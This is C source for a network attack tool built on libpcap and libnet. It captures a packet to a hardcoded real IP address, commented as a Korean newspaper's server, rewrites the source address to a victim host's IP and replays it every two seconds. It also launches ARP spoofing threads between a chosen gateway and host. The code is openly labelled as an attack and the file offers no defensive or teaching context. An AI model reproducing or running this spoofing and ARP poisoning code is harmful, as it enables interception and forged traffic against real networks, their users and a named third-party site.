#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <errno.h>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>
#include "nethack.h"

/* define		*/
char	*dev = "wlan0";
char	*s_ip = "183.111.172.9";	/* 아시아경제 신문사	*/
int		s_port = 80;


/* global		*/
char	interface[12];
char	gateway[16];
char	host[16];
char	*log_f = NULL;

libnet_t	*lnsock;
pcap_t	*pd;
int		lock_f;
u_char	packet_buff[BUFSIZ];
int		packet_len;


/* global		*/
void	*thread_send();
void	*thread_packet();
void	*thread_arp1();
void	*thread_arp2();
int		packet_init(char *intf, char *ebuf);
int		packet_make();
int		packet_send();
void	packet_print(unsigned char *str, int len);
int		send_init(char *intf, char *ebuf);

/***********************************************************
 * main()
 **********************************************************/
int main(int argc, char *argv[])
{
	int mode, retc;
	char ebuf[BUFSIZ];
	pthread_t tid, tpack, tarp1, tarp2;

	if (argc != 5)
	{
		printf("%s mode interface gateway host (%d)\n", argv[0], argc);
		return 0;
	}

	mode = atoi(argv[1]);
	memset(interface, 0x00, sizeof(interface));
	strcat(interface, argv[2]);
	memset(gateway, 0x00, sizeof(gateway));
	strcat(gateway, argv[3]);
	memset(host, 0x00, sizeof(host));
	strcat(host, argv[4]);

	if (mode & MODE_SNIF)
		log_f = NULL;
	else
		log_f = host;

	if (!packet_init(dev, ebuf)) {
		fprintf(stderr, "packet_init failed: %s\n", ebuf);
		exit(1);
	}

	if (!send_init(dev, ebuf)) {
		fprintf(stderr, "send_init failed: %s\n", ebuf);
		exit(1);
	}

	lock_f = 1;
	retc = pthread_create(&tid, NULL, thread_send, NULL);
	if(retc) {
		fprintf(stderr, "pthread create failed\n");
		exit(1);
	}
	pthread_detach(tid);

	lock_f = 0;
	if (!packet_make()) { 
		fprintf(stderr, "packet_make failed\n");
		exit(1);
	}

	/* attack	*/
	if (mode & MODE_ARP1)
	{
		retc = pthread_create(&tarp1, NULL, thread_arp1, NULL);
		if(retc) {
			fprintf(stderr, "thread_arp1 failed\n");
			exit(1);
		}
		pthread_detach(tarp1);
	}

	if (mode & MODE_ARP2)
	{
		retc = pthread_create(&tarp2, NULL, thread_arp2, NULL);
		if(retc) {
			fprintf(stderr, "thread_arp2 failed\n");
			exit(1);
		}
		pthread_detach(tarp2);
	}

	if (mode & MODE_PSND)
	{
		retc = pthread_create(&tpack, NULL, thread_packet, NULL);
		if(retc) {
			fprintf(stderr, "thread_packet failed\n");
			exit(1);
		}
		pthread_detach(tpack);
	}

	for (;;)
	{
		sleep(1);
	}

	exit(0);
}

/***********************************************************
 * packet_init()
 **********************************************************/
int packet_init(char *intf, char *ebuf)
{
	char filter[BUFSIZ];
	libnet_t *ln;
	u_int32_t llip;
	struct libnet_ether_addr *llmac;
	u_int net, mask;
	struct bpf_program fcode;

	ln = libnet_init(LIBNET_LINK_ADV, dev, ebuf);
	if (ln == NULL)
		return 0;

	llip = libnet_get_ipaddr4(ln);
	llmac = libnet_get_hwaddr(ln);

	unsigned char *strip = (unsigned char *)&llip;
	snprintf(filter, sizeof(filter), "host %s", s_ip); 
	//printf("%s\n", filter);

	/* Open interface for sniffing, don't set promiscuous mode. */
	if (pcap_lookupnet(dev, &net, &mask, ebuf) == -1)
		return 0;

	if (!(pd = pcap_open_live(dev, BUFSIZ, 0, 1024, ebuf)))
		return 0;

	if (pcap_compile(pd, &fcode, filter, 1, mask) < 0) {
		strcpy(ebuf, pcap_geterr(pd));
		return 0;
	}
	if (pcap_setfilter(pd, &fcode) == -1) {
		strcpy(ebuf, pcap_geterr(pd));
		return 0;
	}

	return 1;
}

/***********************************************************
 * send_init()
 **********************************************************/
int send_init(char *intf, char *ebuf)
{
  lnsock = libnet_init(LIBNET_RAW4_ADV, intf, ebuf);
  if (lnsock == NULL) {
    strcpy(ebuf, strerror(errno));
    return 0;
  }

  return 1;
}

/***********************************************************
 * thread_send()
 **********************************************************/
void *thread_send()
{
	while (1)
	{
		if (lock_f)
		{
			usleep(100000);
			continue;
		}
		break;
	}

	packet_send();
}

/***********************************************************
 * packet_send()
 **********************************************************/
int packet_send()
{
	int spsock;
    struct sockaddr_in serv_addr;
    int str_len;

    spsock = socket(PF_INET, SOCK_STREAM, 0);
    if(spsock == -1)
        return -1;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(s_ip);
    serv_addr.sin_port = htons(s_port);
    if(connect(spsock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == -1)
        return -1;
    close(spsock);
    return 0;
}

/***********************************************************
 * packet_make()
 **********************************************************/
int packet_make()
{
	struct pcap_pkthdr pkthdr;
	//struct ether_header *eth;
	struct ip *iph;
	u_char *pkt;
	int eth_hdr;
	int len;

	eth_hdr = 14; /* Ethernet header length */

	if ((pkt = (char *)pcap_next(pd, &pkthdr)) != NULL) 
	{
		iph = (struct ip *)(pkt + eth_hdr); 

		// attack : mac != IP	
		iph->ip_src.s_addr = inet_addr(host);

		len = ntohs(iph->ip_len);
		if (len > pkthdr.len)
			len = pkthdr.len;

		memset(packet_buff, 0x00, sizeof(packet_buff));
		memcpy(packet_buff, pkt + eth_hdr, len);
		packet_len = len;

		//packet_print(packet_buff, packet_len);

		return 1;
	}

	return 0;
}

/***********************************************************
 * packet_print()
 **********************************************************/
void packet_print(unsigned char *str, int len)
{
	struct ip *iph;
	struct tm *tm;
	time_t tt;
	int ii;
	char src[16], dst[16];

	iph = (struct ip *)str;
	strcpy(src, inet_ntoa(iph->ip_src));
	strcpy(dst, inet_ntoa(iph->ip_dst));

	tt = time(NULL);
	tm = localtime(&tt);

	printf("[%02d:%02d:%02d] %s > %s\n", tm->tm_hour, 
		tm->tm_min, tm->tm_sec, src, dst);

	for (ii = 0; ii < len; ii++)
	{
		printf("%02x ", str[ii]);
		if (((ii+1) % 16) == 0)
			printf("\n");
		else if (((ii+1) % 8) == 0)
			printf("  ");
	}
	printf("\n\n");
}

/***********************************************************
 * thread_packet()
 **********************************************************/
void *thread_packet()
{
	int slen;

	while (1)
	{
		while ((slen = libnet_write_raw_ipv4(lnsock, 
				packet_buff, packet_len)) != packet_len) 
		{
			printf("attack failed\n");
			return NULL;
		}
		//packet_print((unsigned char *)packet_buff, packet_len);
		hacklog(log_f, "packet send [%d]\n", slen);
		sleep(2);
	}

	return NULL;
}

/***********************************************************
 * thread_arp1()
 **********************************************************/
void *thread_arp1()
{
	arpspoof(log_f, interface, host, gateway);
	return NULL;
}

/***********************************************************
 * thread_arp2()
 **********************************************************/
void *thread_arp2()
{
	arpspoof(log_f, interface, gateway, host);
	return NULL;
}


